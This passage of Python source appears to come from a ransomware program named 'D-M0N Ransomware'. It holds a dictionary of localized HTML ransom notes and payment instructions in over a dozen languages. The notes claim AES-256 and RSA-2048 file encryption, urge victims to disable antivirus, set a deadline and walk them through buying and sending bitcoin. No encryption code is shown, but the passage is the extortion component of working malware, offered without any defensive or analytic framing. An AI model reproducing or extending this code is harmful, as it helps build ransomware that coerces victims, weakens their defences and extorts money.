usunąć to oprogramowanie lub jego pliki, lub odszyfrować swoje pliki bez płacenia okupu, twoje pliki pozostaną zaszyfrowane i nigdy ich już nie zobaczysz!</h5></p></div>",
        "PT": f"<div style='overflow: auto;'><h5>O que é isso?</h5><p style='font-size: 10px;'>Você se tornou uma vítima do vírus <b>D-M0N Ransomware</b>! Seus arquivos foram criptografados (portanto, agora estão inutilizáveis) usando <b>AES-256</b> (modo CBC) e <b>RSA-2048</b>, que são <b>algoritmos de criptografia de nível militar</b>. Para recuperar seus arquivos, você deve seguir as instruções abaixo.</p><h5>Como posso recuperar meus arquivos?</h5><p style='font-size: 10px;'>Primeiro, por favor, desative seu antivírus, pois, se estiver ativado, pode excluir este programa e seus arquivos ficarão <b>perdidos para sempre</b>.<br>Seu antivírus está agora desativado? Ótimo, vamos começar: isso é um <b>RANSOMWARE</b>, então se você quiser recuperar seus arquivos, precisa nos pagar um <b>resgate</b> em <b>bitcoins</b>, que atualmente é <b>{BTC_RANSOM} BTC</b> (por favor, verifique o preço atual do Bitcoin).<br><b style='color: red;'>Você tem {MAX_DAYS_TO_PAY} dias para pagar (a contagem começou no momento em que os arquivos foram criptografados), após 5 dias seus arquivos serão perdidos para sempre e você NUNCA poderá recuperá-los. NUNCA.</b><br>Por favor, lembre-se de que se você decidir não pagar o resgate, também não poderá recuperar seus arquivos, pois apenas nós temos a chave privada (que pode descriptografar os arquivos) e usamos os algoritmos de criptografia mais seguros do mundo, que são até utilizados por serviços secretos e pelo exército :D<br>---<br>Se você decidiu recuperar seus arquivos, siga as instruções no painel 'Instruções de Descriptografia' à esquerda para pagar corretamente o resgate. Depois de pagar, garantimos que seus arquivos serão 100% descriptografados, este vírus será removido e você poderá usar seu computador como antes.</p><p style='font-size: 14px; color: red;'><h5>AVISO! Se você tentar excluir este software ou seus arquivos ou descriptografar seus arquivos sem pagar o resgate, seus arquivos permanecerão criptografados e você nunca mais os verá!</h5></p></div>",
        "RO": f"<div style='overflow: auto;'><h5>Ce este asta?</h5><p style='font-size: 10px;'>Ai devenit victima virusului <b>D-M0N Ransomware</b>! Fișierele tale au fost criptate (deci acum sunt inutilizabile) folosind <b>AES-256</b> (mod CBC) și <b>RSA-2048</b>, care sunt <b>algoritmi de criptare de nivel militar</b>. Pentru a-ți recupera fișierele, trebuie să urmezi instrucțiunile de mai jos.</p><h5>Cum pot să-mi recuperez fișierele?</h5><p style='font-size: 10px;'>În primul rând, te rugăm să dezactivezi antivirusul tău, deoarece, dacă este activat, ar putea șterge acest program și fișierele tale vor fi <b>pierdute pentru totdeauna</b>.<br>Antivirusul tău este acum dezactivat? Bine, să începem: acesta este un <b>RANSOMWARE</b>, așa că, dacă vrei să-ți recuperezi fișierele, trebuie să ne plătești un <b>răscumpărare</b> în <b>bitcoini</b>, care în prezent este <b>{BTC_RANSOM} BTC</b> (te rugăm să verifici prețul actual al Bitcoin-ului).<br><b style='color: red;'>Ai {MAX_DAYS_TO_PAY} zile pentru a plăti (numărătoarea inversă a început în momentul în care fișierele au fost criptate), după 5 zile fișierele tale vor fi pierdute pentru totdeauna și nu le vei putea RECUPERA NICIODATĂ. NICIODATĂ.</b><br>Te rugăm să reții că, dacă decizi să nu plătești răscumpărarea, nu vei putea recupera fișierele tale, deoarece doar noi avem cheia privată (care poate decripta fișierele) și folosim cele mai sigure algoritmi de criptare din lume, care sunt folosiți chiar și de agențiile secrete și armată :D<br>---<br>Dacă ai ales să-ți recuperezi fișierele, te rugăm să urmezi instrucțiunile din panoul 'Instrucțiuni de Decriptare' din stânga, pentru a plăti corect răscumpărarea. După ce ai plătit, garantăm că fișierele tale vor fi decriptate 100%, acest virus va fi șters și vei putea folosi computerul tău ca înainte.</p><p style='font-size: 14px; color: red;'><h5>ATENȚIE! Dacă încerci să ștergi acest software sau fișierele sale sau să decriptezi fișierele tale fără a plăti răscumpărarea, fișierele tale vor rămâne criptate și nu le vei mai vedea niciodată!</h5></p></div>",
        "RU": f"<div style='overflow: auto;'><h5>Что это?</h5><p style='font-size: 10px;'>Вы стали жертвой вируса <b>D-M0N Ransomware</b>! Ваши файлы были зашифрованы (теперь они непригодны для использования) с использованием <b>AES-256</b> (режим CBC) и <b>RSA-2048</b>, которые являются <b>алгоритмами шифрования военного уровня</b>. Чтобы восстановить ваши файлы, вам нужно следовать инструкциям ниже.</p><h5>Как я могу восстановить свои файлы?</h5><p style='font-size: 10px;'>Прежде всего, пожалуйста, отключите ваш антивирус, потому что, если он включен, он может удалить эту программу, и ваши файлы будут <b>навсегда потеряны</b>.<br>Ваш антивирус теперь отключен? Отлично, давайте начнем: это <b>RANSOMWARE</b>, поэтому, если вы хотите восстановить свои файлы, вы должны заплатить нам <b>ВЫКУП</b> в <b>биткойнах</b>, который в настоящее время составляет <b>{BTC_RANSOM} BTC</b> (пожалуйста, проверьте текущую цену биткойна).<br><b style='color: red;'>У вас есть {MAX_DAYS_TO_PAY} дней для оплаты (отсчет начался в момент, когда файлы были зашифрованы), через 5 дней ваши файлы будут безвозвратно утеряны, и вы НИКОГДА не сможете их восстановить. НИКОГДА.</b><br>Пожалуйста, помните, что если вы решите не платить выкуп, вы также не сможете восстановить свои файлы, потому что только у нас есть закрытый ключ (который может расшифровать файлы), и мы используем самые безопасные алгоритмы шифрования в мире, даже секретные службы и армия используют их :D<br>---<br>Если вы решили восстановить свои файлы, пожалуйста, следуйте инструкциям на панели 'Инструкции по расшифровке' слева, чтобы правильно оплатить выкуп. После оплаты мы гарантируем, что ваши файлы будут расшифрованы на 100%, этот вирус будет удален, и вы сможете использовать свой компьютер так же, как и прежде.</p><p style='font-size: 14px; color: red;'><h5>ПРЕДУПРЕЖДЕНИЕ! Если вы попытаетесь удалить это ПО или его файлы или расшифровать ваши файлы без оплаты выкупа, ваши файлы останутся зашифрованными, и вы больше никогда их не увидите!</h5></p></div>",
        "SV": f"<div style='overflow: auto;'><h5>Vad är detta?</h5><p style='font-size: 10px;'>Du har blivit ett offer för viruset <b>D-M0N Ransomware</b>! Dina filer har krypterats (så de är nu oanvändbara) med <b>AES-256</b> (CBC-läge) och <b>RSA-2048</b>, som är <b>militärklassade krypteringsalgoritmer</b>. För att återfå dina filer måste du följa instruktionerna nedan.</p><h5>Hur kan jag återfå mina filer?</h5><p style='font-size: 10px;'>Först och främst, vänligen inaktivera ditt antivirusprogram, eftersom det, om det är aktiverat, kan ta bort det här programmet och dina filer kommer att vara <b>förlorade för alltid</b>.<br>Är ditt antivirusprogram nu inaktiverat? Bra, låt oss börja: detta är ett <b>RANSOMWARE</b>, så om du vill återfå dina filer måste du betala oss en <b>LÖSEN</b> i <b>bitcoin</b>, vilket för närvarande är <b>{BTC_RANSOM} BTC</b> (vänligen kontrollera det aktuella priset på bitcoin).<br><b style='color: red;'>Du har {MAX_DAYS_TO_PAY} dagar på dig att betala (nedräkningen började när filerna krypterades), efter 5 dagar kommer dina filer att förloras permanent och du kommer ALDRIG att kunna återfå dem. ALDRIG.</b><br>Kom ihåg att om du väljer att inte betala lösen, kommer du inte heller att kunna återfå dina filer, för endast vi har den privata nyckeln (som kan dekryptera filerna) och vi använder de säkraste krypteringsalgoritmerna i världen, till och med hemliga tjänster och armén använder dem :D<br>---<br>Om du har valt att återfå dina filer, vänligen följ instruktionerna på panelen 'Dekrypteringsinstruktioner' till vänster för att betala lösen korrekt. Efter att du har betalat garanterar vi att dina filer kommer att dekrypteras till 100%, det här viruset kommer att tas bort och du kommer att kunna använda din dator som tidigare.</p><p style='font-size: 14px; color: red;'><h5>VARNING! Om du försöker ta bort den här programvaran eller dess filer eller dekryptera dina filer utan att betala lösen, kommer dina filer att förbli krypterade och du kommer aldrig att se dem igen!</h5></p></div>",
        "SW": f"<div style='overflow: auto;'><h5>Nini hii?</h5><p style='font-size: 10px;'>Umeshambuliwa na virus wa <b>D-M0N Ransomware</b>! Faili zako zimefungwa (hivyo sasa hazitumiki) kwa kutumia <b>AES-256</b> (mode ya CBC) na <b>RSA-2048</b>, ambazo ni <b>algorithms za usimbaji za kiwango cha jeshi</b>. Ili kurejesha faili zako, utahitaji kufuata maagizo hapa chini.</p><h5>Ninaweza vipi kurejesha faili zangu?</h5><p style='font-size: 10px;'>Kwanza kabisa, tafadhali zima antivirus yako, kwa sababu ikiwa imewashwa inaweza kufuta programu hii na faili zako zitakuwa <b>zipotea milele</b>.<br>Antivirus yako sasa imezimwa? Vizuri, hebu tuanze: hii ni <b>RANSOMWARE</b>, hivyo ikiwa unataka kurejesha faili zako, itabidi utupe <b>RANSOM</b> kwa <b>bitcoin</b>, ambayo kwa sasa ni <b>{BTC_RANSOM} BTC</b> (tafadhali angalia bei ya sasa ya Bitcoin).<br><b style='color: red;'>Una {MAX_DAYS_TO_PAY} siku za kulipa (kuhesabu kuanza wakati faili zilipokewa), baada ya siku 5 faili zako zitapotea kabisa na huwezi KABISA kuzirejesha. KABISA.</b><br>Tafadhali kumbuka kwamba ukichagua kutolipa fidia, huwezi pia kurejesha faili zako, kwa sababu ni sisi pekee tuna funguo ya faragha (ambayo inaweza kufungua faili) na tunatumia algorithms salama zaidi za usimbaji duniani, hata huduma za siri na jeshi zinazitumia :D<br>---<br>Ili urejeshe faili zako, tafadhali fuata maagizo kwenye paneli ya 'Maagizo ya Kufungua' kushoto ili kulipa fidia kwa usahihi. Baada ya kulipa, tunahakikisha kwamba faili zako zitafunguliwa kwa 100%, virusi hivi vitafutwa na utaweza kutumia kompyuta yako kama zamani.</p><p style='font-size: 14px; color: red;'><h5>ONYO! Ikiwa jaribu kufuta programu hii au faili zake au kufungua faili zako bila kulipa fidia, faili zako zitaendelea kuwa zimefungwa na hutaweza kuziona tena!</h5></p></div>",
        "TH": f"<div style='overflow: auto;'><h5>นี่คืออะไร?</h5><p style='font-size: 10px;'>คุณได้กลายเป็นเหยื่อของไวรัส <b>D-M0N Ransomware</b>! ไฟล์ของคุณถูกเข้ารหัส (ดังนั้นตอนนี้ไม่สามารถใช้งานได้) โดยใช้ <b>AES-256</b> (โหมด CBC) และ <b>RSA-2048</b> ซึ่งเป็น <b>อัลกอริธึมการเข้ารหัสระดับทหาร</b>. เพื่อกู้คืนไฟล์ของคุณ คุณจะต้องปฏิบัติตามคำแนะนำด้านล่าง.</p><h5>ฉันจะกู้คืนไฟล์ของฉันได้อย่างไร?</h5><p style='font-size: 10px;'>ก่อนอื่นโปรดปิดโปรแกรมป้องกันไวรัสของคุณ เพราะถ้าหากมันเปิดอยู่ อาจลบโปรแกรมนี้และไฟล์ของคุณจะ <b>สูญหายตลอดไป</b>.<br>ตอนนี้โปรแกรมป้องกันไวรัสของคุณถูกปิดแล้วใช่ไหม? ดีมาก มาเริ่มกันเลย: นี่คือ <b>RANSOMWARE</b>, ดังนั้นหากคุณต้องการกู้คืนไฟล์ของคุณ คุณจะต้องจ่าย <b>ค่าไถ่</b> ให้เราใน <b>Bitcoin</b>, ซึ่งปัจจุบันมีราคา <b>{BTC_RANSOM} BTC</b> (โปรดตรวจสอบราคา Bitcoin ปัจจุบัน).<br><b style='color: red;'>คุณมีเวลา {MAX_DAYS_TO_PAY} วันในการชำระเงิน (นับถอยหลังเริ่มต้นเมื่อไฟล์ถูกเข้ารหัส), หลังจาก 5 วัน ไฟล์ของคุณจะสูญหายถาวรและคุณจะไม่สามารถกู้คืนได้อีกตลอดไป. ไม่มีวัน.</b><br>โปรดจำไว้ว่า หากคุณเลือกที่จะไม่จ่ายเงินค่าไถ่ คุณจะไม่สามารถกู้คืนไฟล์ของคุณได้เช่นกัน เพราะมีเพียงเราที่มีคีย์ส่วนตัว (ซึ่งสามารถถอดรหัสไฟล์ได้) และเราใช้ อัลกอริธึมการเข้ารหัสที่ปลอดภัยที่สุดในโลก แม้แต่บริการลับและทหารก็ใช้ :D<br>---<br>หากคุณเลือกที่จะกู้คืนไฟล์ของคุณ โปรดทำตามคำแนะนำในแผง 'คำแนะนำการถอดรหัส' ที่ด้านซ้ายเพื่อชำระเงินค่าไถ่อย่างถูกต้อง หลังจากที่คุณได้ชำระเงินแล้ว เรารับประกันว่าไฟล์ของคุณจะถูกถอดรหัส 100% ไวรัสนี้จะถูกลบและคุณจะสามารถใช้คอมพิวเตอร์ของคุณได้ตามปกติ.</p><p style='font-size: 14px; color: red;'><h5>คำเตือน! หากคุณพยายามลบซอฟต์แวร์นี้หรือไฟล์ของมันหรือถอดรหัสไฟล์ของคุณโดยไม่ชำระค่าไถ่ ไฟล์ของคุณจะยังคงถูกเข้ารหัสและคุณจะไม่เคยเห็นมันอีก!</h5></p></div>",
        "TR": f"<div style='overflow: auto;'><h5>Bu nedir?</h5><p style='font-size: 10px;'>D-M0N Ransomware virüsünün kurbanı oldunuz! Dosyalarınız <b>AES-256</b> (CBC modu) ve <b>RSA-2048</b> kullanılarak şifrelenmiştir (artık kullanılamaz hale gelmiştir) ve bunlar <b>askeri düzeyde şifreleme algoritmalarıdır</b>. Dosyalarınızı geri almak için, aşağıdaki talimatları izlemelisiniz.</p><h5>Dosyalarımı nasıl geri alabilirim?</h5><p style='font-size: 10px;'>Her şeyden önce, lütfen antivirüsünüzü devre dışı bırakın, çünkü etkinse bu programı silebilir ve dosyalarınız <b>sonsuza dek kaybolur</b>.<br>Antivirüsünüz şimdi devre dışı mı? Tamam, şimdi başlayalım: bu bir <b>RANSOMWARE</b>, bu yüzden dosyalarınızı geri almak istiyorsanız, bize <b>kripto para</b> olarak <b>{BTC_RANSOM} BTC</b> ödemeniz gerekecek (lütfen Bitcoin'in mevcut fiyatını kontrol edin).<br><b style='color: red;'>Ödeme yapmak için {MAX_DAYS_TO_PAY} gününüz var (geri sayım dosyaların şifrelendiği anda başladı), 5 gün geçerse dosyalarınız kalıcı olarak kaybolacak ve ASLA geri alamayacaksınız. ASLA.</b><br>Lütfen unutmayın, eğer fidyeyi ödememeyi seçerseniz, dosyalarınızı geri alamayacaksınız, çünkü yalnızca bizim özel anahtarımız var (dosyaları şifreleyebilen) ve dünyanın en güvenli şifreleme algoritmalarını kullanıyoruz, hatta gizli servisler ve ordu da bunu kullanıyor :D<br>---<br>Eğer dosyalarınızı geri almak istiyorsanız, lütfen 'Şifre Çözme Talimatları' panelindeki talimatları takip edin, fidyeyi doğru şekilde ödemek için. Ödemenizi yaptıktan sonra, dosyalarınızın %100 şifresinin çözüleceğini garanti ediyoruz, bu virüs silinecek ve bilgisayarınızı önceden olduğu gibi kullanabileceksiniz.</p><p style='font-size: 14px; color: red;'><h5>UYARI! Bu yazılımı veya dosyalarını silmeye veya dosyalarınızı fidye ödemeden şifre çözmeye çalışırsanız, dosyalarınız şifreli kalacak ve bir daha asla göremeyeceksiniz!</h5></p></div>",
        "UK": f"<div style='overflow: auto;'><h5>Що це?</h5><p style='font-size: 10px;'>Ви стали жертвою вірусу <b>D-M0N Ransomware</b>! Ваші файли були зашифровані (тому зараз вони не придатні для використання) за допомогою <b>AES-256</b> (режим CBC) та <b>RSA-2048</b>, які є <b>алгоритмами шифрування військового рівня</b>. Щоб відновити ваші файли, вам потрібно виконати інструкції нижче.</p><h5>Як я можу відновити свої файли?</h5><p style='font-size: 10px;'>Перш ніж усе, будь ласка, вимкніть антивірус, тому що, якщо він ввімкнений, він може видалити цю програму, і ваші файли будуть <b>втрачені назавжди</b>.<br>Ваш антивірус тепер вимкнено? Добре, давайте почнемо: це <b>RANSOMWARE</b>, тому, якщо ви хочете відновити свої файли, вам потрібно буде заплатити нам <b>ВИКУП</b> у <b>біткойнах</b>, який наразі дорівнює <b>{BTC_RANSOM} BTC</b> (будь ласка, перевірте поточну ціну біткойна).<br><b style='color: red;'>У вас є {MAX_DAYS_TO_PAY} днів для оплати (лічильник почався з моменту, коли файли були зашифровані), через 5 днів ваші файли будуть втрачені назавжди, і ви НІКОЛИ не зможете їх відновити. НІКОЛИ.</b><br>Будь ласка, пам'ятайте, що якщо ви вирішите не платити викуп, ви також не зможете відновити свої файли, тому що тільки у нас є приватний ключ (який може розшифрувати файли), і ми використовуємо найнадійніші алгоритми шифрування у світі, навіть секретні служби та армія їх використовують :D<br>---<br>Якщо ви вирішили відновити свої файли, будь ласка, дотримуйтесь інструкцій на панелі 'Інструкції по розшифровці' зліва, щоб правильно оплатити викуп. Після того, як ви сплатите, ми гарантуємо, що ваші файли будуть розшифровані на 100%, цей вірус буде видалено, і ви зможете використовувати свій комп'ютер так само, як і раніше.</p><p style='font-size: 14px; color: red;'><h5>УВАГА! Якщо ви намагаєтеся видалити це програмне забезпечення або його файли або розшифрувати свої файли без оплати викупу, ваші файли залишаться зашифрованими, і ви більше ніколи їх не побачите!</h5></p></div>",
        "ZH": f"<div style='overflow: auto;'><h5>这是什么？</h5><p style='font-size: 12px;'>您已成为<b>D-M0N Ransomware</b>病毒的受害者！您的文件已被加密（因此现在无法使用），使用<b>AES-256</b>（CBC模式）和<b>RSA-2048</b>，这些是<b>军用级别的加密算法</b>。要恢复您的文件，您必须遵循以下说明。</p><h5>我该如何恢复我的文件？</h5><p style='font-size: 12px;'>首先，请禁用您的杀毒软件，因为如果它处于启用状态，可能会删除此程序，您的文件将<b>永远丢失</b>。<br>您的杀毒软件现在已禁用？很好，现在我们开始：这是一个<b>RANSOMWARE</b>，因此如果您想恢复文件，您必须向我们支付<b>赎金</b>，以<b>比特币</b>的形式，当前金额为<b>{BTC_RANSOM} BTC</b>（请检查比特币的当前价格）。<br><b style='color: red;'>您有{MAX_DAYS_TO_PAY}天的时间来支付（倒计时从文件被加密的那一刻开始），超过5天后，您的文件将被永久丢失，您将永远无法恢复它们。绝对不行。</b><br>请记住，如果您选择不支付赎金，您也将无法恢复文件，因为只有我们拥有私钥（可以解密文件），而且我们使用世界上最安全的加密算法，甚至秘密服务和军队也在使用它们 :D<br>---<br>如果您选择恢复文件，请按照左侧“解密说明”面板上的说明正确支付赎金。支付后，我们保证您的文件将100%解密，该病毒将被删除，您将能够像以前一样使用电脑。</p><p style='font-size: 16px; color: red;'><h5>警告！如果您尝试在不支付赎金的情况下删除此软件或其文件或解密您的文件，您的文件将保持加密状态，您将再也无法看到它们！</h5></p></div>"
    },
    "instructions": {
        "EN": f"<div style='overflow: auto;'><h5>Decryption Instructions</h5><p style='font-size: 10px;'><br><b>First, please read the main info on the right panel.</b> Now, follow these instructions step-by-step to decrypt your files. <b>Need help? click [What is Bitcoin?] or [How to buy bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Buy bitcoins (buy approximately {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC for the ransom and transaction fees). <b>Need help? Click [How to buy bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Send {BTC_RANSOM} BTC to our address, find it at the bottom left of this window (click <b>[How to send bitcoin]</b> for help). Confirm transaction.</p><p style='font-size: 10px;'><b>3. </b>After payment, click <b>[Check payment]</b> and enter your wallet address. If it doesn't work, check that you have paid the correct amount and try again a bit later until it works. Your files will be recovered.</p></div>",
        "AR": f"<div style='overflow: auto;'><h5>تعليمات فك التشفير</h5><p style='font-size: 10px;'><br><b>أولاً، يرجى قراءة المعلومات الرئيسية في اللوحة اليمنى.</b> الآن، اتبع هذه التعليمات خطوة بخطوة لفك تشفير ملفاتك. <b>تحتاج إلى مساعدة؟ انقر على [ما هو البيتكوين؟] أو [كيف تشتري بيتكوين؟].</b></p><p style='font-size: 10px;'><b>1. </b>اشترِ بيتكوين (اشترِ حوالي {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC لفدية ورسوم المعاملات). <b>تحتاج إلى مساعدة؟ انقر على [كيف تشتري بيتكوين؟].</b></p><p style='font-size: 10px;'><b>2. </b>أرسل {BTC_RANSOM} BTC إلى عنواننا، تجده في أسفل يسار هذه النافذة (انقر <b>[كيف ترسل بيتكوين]</b> للمساعدة). أكد المعاملة.</p><p style='font-size: 10px;'><b>3. </b>بعد الدفع، انقر على <b>[تحقق من الدفع]</b> وأدخل عنوان محفظتك. إذا لم يعمل، تحقق من أنك دفعت المبلغ الصحيح وحاول مرة أخرى بعد قليل حتى يعمل. سيتم استرداد ملفاتك.</p></div>",
        "BN": f"<div style='overflow: auto;'><h5>ডিক্রিপশন নির্দেশাবলী</h5><p style='font-size: 10px;'><br><b>প্রথমত, দয়া করে ডান প্যানেলে প্রধান তথ্য পড়ুন।</b> এখন, আপনার ফাইলগুলি ডিক্রিপ্ট করতে এই নির্দেশাবলী অনুযায়ী পদক্ষেপে পদক্ষেপ অনুসরণ করুন। <b>সাহায্য প্রয়োজন? ক্লিক করুন [বিটকয়েন কী?] অথবা [কিভাবে বিটকয়েন কিনবেন?]।</b></p><p style='font-size: 10px;'><b>1. </b>বিটকয়েন কিনুন (প্রায় {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC মুক্তিপণ এবং লেনদেনের ফি হিসাবে কিনুন)। <b>সাহায্য প্রয়োজন? ক্লিক করুন [কিভাবে বিটকয়েন কিনবেন?]।</b></p><p style='font-size: 10px;'><b>2. </b>আমাদের ঠিকনায় {BTC_RANSOM} BTC পাঠান, এটি এই উইন্ডোর নিচের বাম দিকে খুঁজুন (সাহায়্যের জন্য ক্লিক করুন <b>[কিভাবে বিটকয়েন পাঠাবেন]</b>)। লেনদেন নিশ্চিত করুন।</p><p style='font-size: 10px;'><b>3. </b>পেমেন্টের পরে, <b>[পেমেন্ট চেক করুন]</b> এ ক্লিক করুন এবং আপনার ওয়ালেট ঠিকানা প্রবেশ করুন। যদি এটি কাজ না করে, নিশ্চিত করুন যে আপনি সঠিক পরিমাণ পরিশোধ করেছেন এবং পরে আবার চেষ্টা করুন যতক্ষণ না এটি কাজ করে। আপনার ফাইলগুলি পুনরুদ্ধার হবে।</p></div>",
        "CS": f"<div style='overflow: auto;'><h5>Pokyny k dešifrování</h5><p style='font-size: 10px;'><br><b>Nejprve si prosím přečtěte hlavní informace na pravém panelu.</b> Nyní postupujte podle těchto pokynů krok za krokem, abyste dešifrovali své soubory. <b>Potřebujete pomoc? klikněte na [Co je Bitcoin?] nebo [Jak koupit bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Kupte bitcoiny (koupit přibližně {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC na výkupné a transakční poplatky). <b>Potřebujete pomoc? Klikněte na [Jak koupit bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Pošlete {BTC_RANSOM} BTC na naši adresu, najdete ji v dolním levém rohu tohoto okna (klikněte <b>[Jak poslat bitcoin]</b> pro pomoc). Potvrďte transakci.</p><p style='font-size: 10px;'><b>3. </b>Po platbě klikněte na <b>[Zkontrolovat platbu]</b> a zadejte svou adresu peněženky. Pokud to nefunguje, zkontrolujte, že jste zaplatili správnou částku a zkuste to znovu za chvíli, dokud to nebude fungovat. Vaše soubory budou obnoveny.</p></div>",
        "DA": f"<div style='overflow: auto;'><h5>Afkodningsinstruktioner</h5><p style='font-size: 10px;'><br><b>Først skal du venligst læse hovedinformationen i højre panel.</b> Følg nu disse instruktioner trin-for-trin for at afkode dine filer. <b>Har du brug for hjælp? klik på [Hvad er Bitcoin?] eller [Hvordan køber man bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Køb bitcoins (køb cirka {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC til løsepenge og transaktionsgebyrer). <b>Har du brug for hjælp? Klik på [Hvordan køber man bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Send {BTC_RANSOM} BTC til vores adresse, find den nederst til venstre i dette vindue (klik <b>[Hvordan sender man bitcoin]</b> for hjælp). Bekræft transaktionen.</p><p style='font-size: 10px;'><b>3. </b>Efter betaling, klik på <b>[Tjek betaling]</b> og indtast din tegnebogsadresse. Hvis det ikke virker, skal du kontrollere, at du har betalt det rigtige beløb, og prøve igen lidt senere, indtil det virker. Dine filer vil blive gendannet.</p></div>",
        "DE": f"<div style='overflow: auto;'><h5>Entschlüsselungsanweisungen</h5><p style='font-size: 10px;'><br><b>Bitte lesen Sie zuerst die Hauptinformationen im rechten Bereich.</b> Befolgen Sie nun diese Anweisungen Schritt für Schritt, um Ihre Dateien zu entschlüsseln. <b>Hilfe benötigt? Klicken Sie auf [Was ist Bitcoin?] oder [Wie kaufe ich Bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Kaufen Sie Bitcoins (kaufen Sie ca. {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC für das Lösegeld und Transaktionsgebühren). <b>Hilfe benötigt? Klicken Sie auf [Wie kaufe ich Bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Überweisen Sie {BTC_RANSOM} BTC an unsere Adresse, die Sie unten links in diesem Fenster finden (klicken Sie <b>[Wie man Bitcoin sendet]</b> für Hilfe). Bestätigen Sie die Transaktion.</p><p style='font-size: 10px;'><b>3. </b>Nach der Zahlung klicken Sie auf <b>[Zahlung überprüfen]</b> und geben Sie Ihre Wallet-Adresse ein. Wenn es nicht funktioniert, überprüfen Sie, ob Sie den richtigen Betrag bezahlt haben, und versuchen Sie es später erneut, bis es funktioniert. Ihre Dateien werden wiederhergestellt.</p></div>",
        "EL": f"<div style='overflow: auto;'><h5>Οδηγίες Αποκρυπτογράφησης</h5><p style='font-size: 10px;'><br><b>Πρώτα διαβάστε τις κύριες πληροφορίες στον δεξιό πίνακα.</b> Τώρα, ακολουθήστε αυτές τις οδηγίες βήμα προς βήμα για να αποκρυπτογραφήσετε τα αρχεία σας. <b>Χρειάζεστε βοήθεια; κάντε κλικ στο [Τι είναι το Bitcoin;] ή [Πώς να αγοράσετε bitcoin;].</b></p><p style='font-size: 10px;'><b>1. </b>Αγοράστε bitcoins (αγοράστε περίπου {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC για τα λύτρα και τα τέλη συναλλαγής). <b>Χρειάζεστε βοήθεια; Κάντε κλικ στο [Πώς να αγοράσετε bitcoin;].</b></p><p style='font-size: 10px;'><b>2. </b>Στείλτε {BTC_RANSOM} BTC στη διεύθυνσή μας, βρείτε την κάτω αριστερά σε αυτό το παράθυρο (κάντε κλικ <b>[Πώς να στείλετε bitcoin]</b> για βοήθεια). Επιβεβαιώστε τη συναλλαγή.</p><p style='font-size: 10px;'><b>3. </b>Μετά την πληρωμή, κάντε κλικ στο <b>[Έλεγχος πληρωμής]</b> και εισάγετε τη διεύθυνση πορτοφολιού σας. Αν δεν λειτουργεί, ελέγξτε ότι έχετε πληρώσει το σωστό ποσό και δοκιμάστε ξανά λίγο αργότερα μέχρι να λειτουργήσει. Τα αρχεία σας θα ανακτηθούν.</p></div>",
        "ES": f"<div style='overflow: auto;'><h5>Instrucciones de descifrado</h5><p style='font-size: 10px;'><br><b>Primero, por favor lea la información principal en el panel derecho.</b> Ahora, siga estas instrucciones paso a paso para descifrar sus archivos. <b>¿Necesita ayuda? haga clic en [¿Qué es Bitcoin?] o [¿Cómo comprar bitcoin?].</b></p><p style='font-size: 10px;'><b>1. </b>Compre bitcoins (compre aproximadamente {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC para el rescate y las tarifas de transacción). <b>¿Necesita ayuda? Haga clic en [¿Cómo comprar bitcoin?].</b></p><p style='font-size: 10px;'><b>2. </b>Envíe {BTC_RANSOM} BTC a nuestra dirección, que se encuentra en la parte inferior izquierda de esta ventana (haga clic en <b>[¿Cómo enviar bitcoin?]</b> para obtener ayuda). Confirme la transacción.</p><p style='font-size: 10px;'><b>3. </b>Después del pago, haga clic en <b>[Verificar pago]</b> e ingrese su dirección de billetera. Si no funciona, verifique que ha pagado la cantidad correcta y vuelva a intentarlo más tarde hasta que funcione. Sus archivos serán recuperados.</p></div>",
        "ET": f"<div style='overflow: auto;'><h5>Krüpteerimisjuhised</h5><p style='font-size: 10px;'><br><b>Esimese asjana lugege palun paremal paneelil olevaid peamisi andmeid.</b> Nüüd järgige neid juhiseid samm-sammult, et oma faile dekrüpteerida. <b>Kas vajate abi? klõpsake [Mis on Bitcoin?] või [Kuidas osta bitcoine?].</b></p><p style='font-size: 10px;'><b>1. </b>Ostke bitcoine (ostke umbes {round(BTC_RANSOM*BTC_FEES_MULTIPLICATOR, 3)} BTC lunaraha ja tehingutasude jaoks). <b>Kas vajate abi? Klõpsake [Kuidas osta bitcoine?].</b></p><p style='font-size: 10px;'><b>2. </b>Saatke {BTC_RANSOM} BTC meie aadressile, leidke see selle akna vasakus alanurgas (klõpsake <b>[Kuidas saata bitcoine]</b> abi saamiseks). Kinnitage tehing.</p><p style='font-size: 10px;'><b>3. </b>Pärast makset klõpsake <b>[Kontrollige makset]</b> ja sisestage oma rahakoti aadress. Kui see ei toimi, veenduge, et olete maksnud õige summa ja proovige hiljem uuesti, kuni see töötab. Teie failid taastatakse.</p></div>",
